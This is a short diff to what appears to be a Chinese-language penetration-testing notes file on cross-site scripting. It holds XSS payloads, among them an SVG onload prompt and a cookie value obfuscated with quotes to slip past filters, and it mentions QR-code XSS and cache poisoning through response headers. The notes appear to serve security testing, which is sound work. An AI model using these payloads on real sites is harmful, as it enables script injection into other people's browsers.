@@ -14,3 +14,8 @@ name="><svg onload="prompt(/xss/);"><!--
 
 3.二维码xss
 二维码执行js
+
+4.cookie里的xss
+cookie: hav=xxx 反射到页面上
+payload:cookie:  hav=xss"</sc"ript><sv"g/onloa"d=al"ert"(document.do"main)>
+缓存投毒，http响应里的头Cache-Control和Expires
